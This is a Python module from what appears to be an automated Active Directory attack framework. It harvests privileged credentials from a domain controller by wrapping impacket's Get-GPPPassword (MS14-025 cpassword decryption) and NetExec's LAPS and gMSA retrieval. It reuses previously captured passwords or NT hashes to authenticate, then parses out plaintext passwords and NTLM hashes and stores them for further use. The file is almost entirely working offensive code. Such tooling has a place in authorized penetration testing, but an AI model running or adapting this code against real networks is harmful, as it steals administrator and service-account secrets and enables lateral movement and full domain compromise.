"""Additional credential sources: GPP passwords, LAPS, gMSA.

All read-only. These frequently yield direct privileged credentials and are a
key part of the "try everything" loop.
"""
from __future__ import annotations

import re
from pathlib import Path

from .base import BaseModule


class CredMoreModule(BaseModule):
    name = "credential_sources"
    description = "Extract GPP passwords, LAPS and gMSA secrets"

    def run(self, workdir: Path) -> dict:
        auth = self._pick_auth()
        if not auth:
            return {}
        self._gpp_password(auth)
        self._laps(auth)
        self._gmsa(auth)
        return {"credentials_found": len(self.state.usable_credentials())}

    def _pick_auth(self):
        creds = self.state.usable_credentials()
        if not creds:
            return None
        c = creds[0]
        return (c.domain or self.state.domain, c.username, c.password, c.nthash)

    def _dc(self) -> str | None:
        return (self.state.domain_controllers or [None])[0]

    # ------------------------------------------------------------------
    def _gpp_password(self, auth) -> None:
        """MS14-025: decrypt cpassword from Group Policy Preferences."""
        dc = self._dc()
        if not dc:
            return
        domain, user, pwd, nth = auth
        cmd = self.runner.resolve("Get-GPPPassword", prefix="impacket-")
        args = [cmd, f"{domain}/{user}"]
        if nth:
            args += ["-hashes", f"0x0:{nth}"]
        else:
            args += ["-no-pass"]
        args += ["@" + dc]
        res = self.runner.run(args, timeout=300, silent=True)
        for line in res.out_lines:
            m = re.search(r"\[!\] Found credentials in.*?:\s*(\S+):(\S+)", line)
            if not m:
                m = re.search(r"(\w[\w.\-]*):(\S+)", line)
            if m and "cpassword" in res.stdout.lower():
                user_found, pwd_found = m.group(1), m.group(2)
                self.state.add_credential(
                    username=user_found, password=pwd_found, domain=domain,
                    source="GPP-cpassword")
                self.log_finding(
                    "critical", "GPP password (MS14-025)",
                    f"{user_found} : {pwd_found}",
                    technique="GPP Password")

    # ------------------------------------------------------------------
    def _laps(self, auth) -> None:
        """Read LAPS passwords for computers."""
        dc = self._dc()
        if not dc:
            return
        domain, user, pwd, nth = auth
        args = [self.nxc_bin(), "ldap", dc]
        if nth:
            args += ["-u", user, "-H", nth]
        else:
            args += ["-u", user, "-p", pwd or ""]
        args += ["-d", domain, "-M", "laps"]
        res = self.runner.run(args, timeout=300, silent=True)
        # nxc laps output lines: "LAPS   DC  ...  computer:password" patterns
        for line in res.out_lines:
            m = re.search(r"(\w[\w.\-]*\$?)\s*:\s*([^\s]+)", line)
            if m and _looks_like_laps(line):
                comp = m.group(1)
                pwd_found = m.group(2)
                self.state.add_credential(
                    username=comp, password=pwd_found, domain=domain,
                    source="LAPS")
                self.log_finding(
                    "critical", "LAPS password",
                    f"{comp} : {pwd_found}", technique="LAPS")

    # ------------------------------------------------------------------
    def _gmsa(self, auth) -> None:
        """Retrieve gMSA passwords (NTLM hash)."""
        dc = self._dc()
        if not dc:
            return
        domain, user, pwd, nth = auth
        args = [self.nxc_bin(), "ldap", dc]
        if nth:
            args += ["-u", user, "-H", nth]
        else:
            args += ["-u", user, "-p", pwd or ""]
        args += ["-d", domain, "--gmsa"]
        res = self.runner.run(args, timeout=300, silent=True)
        # gMSA output lines contain account + NTLM hash
        for line in res.out_lines:
            m = re.search(r"(\w[\w.\-]*)\s+[^\s]*\s+([0-9a-fA-F]{32})", line)
            if m:
                acct, nthash = m.group(1), m.group(2)
                self.state.add_credential(
                    username=acct, nthash=nthash, domain=domain,
                    source="gMSA")
                self.log_finding(
                    "critical", "gMSA password",
                    f"{acct} NT hash: {nthash}", technique="gMSA")


def _looks_like_laps(line: str) -> bool:
    low = line.lower()
    return ("laps" in low) or ("admpwd" in low) or (
        "password" in low and "$" in line)
